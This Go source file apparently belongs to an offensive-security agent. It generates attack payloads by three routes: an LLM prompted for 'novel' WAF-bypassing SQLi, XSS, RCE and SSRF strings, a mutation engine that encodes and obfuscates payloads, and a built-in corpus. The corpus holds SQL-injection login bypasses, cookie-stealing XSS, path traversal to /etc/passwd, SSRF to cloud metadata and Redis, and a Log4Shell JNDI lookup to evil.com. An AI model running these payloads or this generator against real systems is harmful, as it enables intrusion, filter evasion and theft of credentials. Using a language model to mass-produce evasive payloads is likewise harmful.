package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/ares/engine/internal/llm"
)

type PayloadGenConfig struct {
	VulnType     string
	TargetTech   []string
	Context      string
	Count        int
	Temperature  float64
	UseMutation  bool
	UseWordlist  bool
	BasePayloads []string
}

type GeneratedPayload struct {
	Payload    string   `json:"payload"`
	Type       string   `json:"type"`
	Technique  string   `json:"technique"`
	Confidence float64  `json:"confidence"`
	Source     string   `json:"source"`
	Variants   []string `json:"variants,omitempty"`
}

type mutationEngine struct {
	encodings    []string
	prefixes     []string
	suffixes     []string
	obfuscations []string
}

func newMutationEngine() *mutationEngine {
	return &mutationEngine{
		encodings:    []string{"url", "double-url", "html", "unicode", "base64", "hex"},
		prefixes:     []string{"'", "\"", "')", "\")", "OR 1", "AND 1", "UNION SELECT", "PAYLOAD"},
		suffixes:     []string{"--", "#", ";--", "/*", "'", "\"", " OR '1'='1", " OR 1=1"},
		obfuscations: []string{" ", "/**/", "/***/", "/*****", "空白", "\t", "\n"},
	}
}

func (m *mutationEngine) Mutate(payload string) []string {
	var results []string
	for _, enc := range m.encodings {
		switch enc {
		case "url":
			results = append(results, urlEncode(payload))
		case "double-url":
			results = append(results, urlEncode(urlEncode(payload)))
		case "html":
			results = append(results, htmlEncode(payload))
		case "unicode":
			results = append(results, unicodeEncode(payload))
		case "base64":
			results = append(results, base64Encode(payload))
		case "hex":
			results = append(results, hexEncode(payload))
		}
	}
	for _, prefix := range m.prefixes {
		results = append(results, prefix+payload)
	}
	for _, suffix := range m.suffixes {
		results = append(results, payload+suffix)
	}
	for _, obf := range m.obfuscations {
		results = append(results, strings.Replace(payload, " ", obf, 1))
	}
	results = append(results, payload+payload)
	results = append(results, reverseString(payload))
	return results
}

func urlEncode(s string) string {
	result := ""
	for _, c := range s {
		switch c {
		case ' ', '\'', '"', '(', ')', '=', ';':
			result += fmt.Sprintf("%%%02X", c)
		default:
			result += string(c)
		}
	}
	return result
}

func htmlEncode(s string) string {
	result := ""
	for _, c := range s {
		switch c {
		case '<': result += "&lt;"
		case '>': result += "&gt;"
		case '&': result += "&amp;"
		case '\'': result += "&#39;"
		case '"': result += "&quot;"
		default: result += string(c)
		}
	}
	return result
}

func unicodeEncode(s string) string {
	result := ""
	for _, c := range s {
		if c >= 128 {
			result += fmt.Sprintf("\\u%04X", c)
		} else {
			result += string(c)
		}
	}
	return result
}

func base64Encode(s string) string {
	enc := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	bytes := []byte(s)
	result := ""
	pad := (3 - len(bytes)%3) % 3
	bytes = append(bytes, make([]byte, pad)...)
	for i := 0; i < len(bytes); i += 3 {
		b0 := int(bytes[i])
		b1 := int(bytes[i+1])
		b2 := int(bytes[i+2])
		result += string(enc[b0>>2])
		result += string(enc[((b0&3)<<4)|(b1>>4)])
		result += string(enc[((b1&15)<<2)|(b2>>6)])
		result += string(enc[b2&63])
	}
	for i := 0; i < pad; i++ {
		b := []byte(result)
		b[len(b)-1-i] = '='
		result = string(b)
	}
	return result
}

func hexEncode(s string) string {
	result := ""
	for _, c := range s {
		result += fmt.Sprintf("%%%.2X", c)
	}
	return result
}

func reverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

type LLMGenerators struct {
	client    *llm.Client
	corpus    []string
	mutations *mutationEngine
	configs   map[string]PayloadGenConfig
}

func NewLLMGenerators(client *llm.Client) *LLMGenerators {
	return &LLMGenerators{
		client:    client,
		corpus:    defaultCorpus(),
		mutations: newMutationEngine(),
		configs:   make(map[string]PayloadGenConfig),
	}
}

func (g *LLMGenerators) Generate(ctx context.Context, cfg PayloadGenConfig) ([]GeneratedPayload, error) {
	var results []GeneratedPayload
	if g.client != nil {
		llmPayloads, err := g.generateFromLLM(ctx, cfg)
		if err == nil {
			results = append(results, llmPayloads...)
		}
	}
	if cfg.UseMutation && len(cfg.BasePayloads) > 0 {
		for _, base := range cfg.BasePayloads {
			variants := g.mutations.Mutate(base)
			for _, v := range variants {
				results = append(results, GeneratedPayload{Payload: v, Type: "mutated", Technique: "mutation", Confidence: 0.7, Source: "mutation-engine"})
			}
		}
	}
	if cfg.UseWordlist {
		for _, p := range g.getFromCorpus(cfg.VulnType) {
			results = append(results, GeneratedPayload{Payload: p, Type: "corpus", Technique: "wordlist", Confidence: 0.6, Source: "corpus"})
		}
	}
	dedup := make(map[string]bool)
	unique := []GeneratedPayload{}
	for _, p := range results {
		if !dedup[p.Payload] {
			dedup[p.Payload] = true
			unique = append(unique, p)
		}
	}
	return unique, nil
}

func (g *LLMGenerators) generateFromLLM(ctx context.Context, cfg PayloadGenConfig) ([]GeneratedPayload, error) {
	prompt := buildLLMPayloadPrompt(cfg)
	messages := []llm.Message{{Role: "user", Content: prompt}}
	response, err := g.client.Complete(ctx, messages, "")
	if err != nil {
		return nil, fmt.Errorf("llm generation: %w", err)
	}
	var payloads []GeneratedPayload
	if err := json.Unmarshal([]byte(response), &payloads); err != nil {
		payloads = parsePayloadsFromText(response, cfg.VulnType)
	}
	return payloads, nil
}

func buildLLMPayloadPrompt(cfg PayloadGenConfig) string {
	var sb strings.Builder
	fmt.Fprintf(&sb, "Generate %d novel %s payloads for target tech: %s.\n", cfg.Count, cfg.VulnType, strings.Join(cfg.TargetTech, ", "))
	if cfg.Context != "" {
		fmt.Fprintf(&sb, "Context: %s\n", cfg.Context)
	}
	fmt.Fprintf(&sb, "\nRequirements:\n- Novel and non-trivial\n- Vary syntax, encoding, bypass techniques\n- Include simple and complex variants\n- Consider WAF bypass\n")
	fmt.Fprintf(&sb, "\nRespond with JSON array:\n")
	fmt.Fprintf(&sb, `[{"payload":"...","type":"sql|xss|rce|ssrf|...","technique":"bypass|obfuscation|union|blind|...","confidence":0.9}]`)
	return sb.String()
}

func parsePayloadsFromText(text string, vulnType string) []GeneratedPayload {
	var results []GeneratedPayload
	text = strings.TrimSpace(text)
	for _, prefix := range []string{"```json", "```"} {
		if strings.HasPrefix(text, prefix) {
			text = strings.TrimPrefix(text, prefix)
			text = strings.TrimSuffix(text, "```")
		}
	}
	lines := strings.Split(text, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "//") || strings.HasPrefix(line, "#") {
			continue
		}
		if strings.HasPrefix(line, "-") || strings.HasPrefix(line, "*") {
			line = strings.TrimPrefix(line, "- *")
		}
		if len(line) < 3 {
			continue
		}
		results = append(results, GeneratedPayload{Payload: line, Type: vulnType, Technique: "llm-generated", Confidence: 0.8, Source: "llm"})
	}
	return results
}

func (g *LLMGenerators) getFromCorpus(vulnType string) []string {
	var out []string
	keywords := map[string][]string{
		"sqli":  {"sql", "injection", "union", "blind", "boolean"},
		"xss":   {"xss", "script", "alert", "svg", "onerror"},
		"rce":   {"rce", "command", "exec", "system", "os"},
		"ssrf":  {"ssrf", "url", "file", "http", "gopher"},
		"idor":  {"idor", "access", "user", "account", "object"},
		"ssti":  {"ssti", "template", "jinja", "freemarker", "velocity"},
		"csrf":  {"csrf", "token", "session", "form", "post"},
	}
	targetKeywords := keywords[vulnType]
	if targetKeywords == nil {
		targetKeywords = []string{vulnType}
	}
	for _, payload := range g.corpus {
		lower := strings.ToLower(payload)
		for _, kw := range targetKeywords {
			if strings.Contains(lower, kw) {
				out = append(out, payload)
			}
		}
	}
	return out
}

func defaultCorpus() []string {
	return []string{
		"admin' OR '1'='1", "admin' OR '1'='1' --", "admin' OR '1'='1' #", "admin' OR '1'='1'/*",
		"admin' or 1=1--", "admin' or 1=1#", "admin') or ('1'='1", "admin') or ('1'='1'--",
		"1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--", "1' UNION SELECT NULL,NULL,NULL--",
		"1' OR 1=1 LIMIT 1--",
		"<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
		"'><script>alert(document.cookie)</script>", "javascript:alert(1)", "<iframe src=javascript:alert(1)>",
		"{{7*7}}", "{{config}}", "${7*7}", "<%= 7*7 %>", "${name}", "${1+1}",
		"../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "/etc/passwd", "file:///etc/passwd",
		"http://localhost/", "http://127.0.0.1/", "http://[::1]/", "http://169.254.169.254/",
		"gopher://127.0.0.1:6379/_INFO", "dict://127.0.0.1:6379/INFO",
		"${jndi:ldap://evil.com/a}", "${env:HOME}", "${env:PATH}", "proc/self/environ",
		"../../../proc/self/environ",
	}
}

func (g *LLMGenerators) GenerateVariants(payload string, count int) []string {
	variants := g.mutations.Mutate(payload)
	if len(variants) > count {
		return variants[:count]
	}
	return variants
}

func BuildBypassPayload(basePayload, bypassType string) string {
	me := newMutationEngine()
	for _, v := range me.Mutate(basePayload) {
		if strings.Contains(v, bypassType) || len(v) > len(basePayload) {
			return v
		}
	}
	return basePayload
}

func GeneratePayloads(params json.RawMessage, sc interface{}) ToolResult {
	var p struct {
		VulnType    string   `json:"vuln_type"`
		TargetTech  []string `json:"target_tech"`
		Context     string   `json:"context"`
		Count       int      `json:"count"`
		Temperature float64  `json:"temperature"`
		UseMutation bool     `json:"use_mutation"`
		UseCorpus   bool     `json:"use_corpus"`
		BasePayloads []string `json:"base_payloads"`
	}
	if err := json.Unmarshal(params, &p); err != nil {
		return ToolResult{Error: fmt.Sprintf("bad params: %v", err), Success: false}
	}
	if p.VulnType == "" {
		return ToolResult{Error: "vuln_type required", Success: false}
	}
	if p.Count == 0 {
		p.Count = 5
	}
	if p.TargetTech == nil {
		p.TargetTech = []string{"generic"}
	}

	var client *llm.Client
	if sc != nil {
		client = llmClientFromCtx(sc)
	}

	cfg := PayloadGenConfig{VulnType: p.VulnType, TargetTech: p.TargetTech, Context: p.Context, Count: p.Count, UseMutation: p.UseMutation, UseWordlist: p.UseCorpus, BasePayloads: p.BasePayloads}
	gen := NewLLMGenerators(client)
	payloads, err := gen.Generate(context.Background(), cfg)
	if err != nil {
		return ToolResult{Error: fmt.Sprintf("generation failed: %v", err), Success: false}
	}
	data, _ := json.MarshalIndent(payloads, "", "  ")
	return ToolResult{Content: string(data), Success: true}
}

func MutatePayload(params json.RawMessage, sc interface{}) ToolResult {
	var p struct {
		Payload string `json:"payload"`
		Count   int    `json:"count"`
	}
	if err := json.Unmarshal(params, &p); err != nil {
		return ToolResult{Error: fmt.Sprintf("bad params: %v", err), Success: false}
	}
	if p.Payload == "" {
		return ToolResult{Error: "payload required", Success: false}
	}
	if p.Count == 0 {
		p.Count = 10
	}
	me := newMutationEngine()
	variants := me.Mutate(p.Payload)
	if len(variants) > p.Count {
		variants = variants[:p.Count]
	}
	data, _ := json.MarshalIndent(variants, "", "  ")
	return ToolResult{Content: string(data), Success: true}
}

func GetPayloadCorpus(params json.RawMessage, sc interface{}) ToolResult {
	var p struct{ VulnType string }
	if err := json.Unmarshal(params, &p); err != nil {
		return ToolResult{Error: fmt.Sprintf("bad params: %v", err), Success: false}
	}
	gen := NewLLMGenerators(nil)
	var payloads []string
	if p.VulnType != "" {
		payloads = gen.getFromCorpus(p.VulnType)
	} else {
		payloads = gen.corpus
	}
	return ToolResult{Content: strings.Join(payloads, "\n"), Success: true}
}

func llmClientFromCtx(sc interface{}) *llm.Client {
	type llmClientGetter interface {
		GetLLMClient() *llm.Client
	}
	if getter, ok := sc.(llmClientGetter); ok {
		return getter.GetLLMClient()
	}
	return nil
}
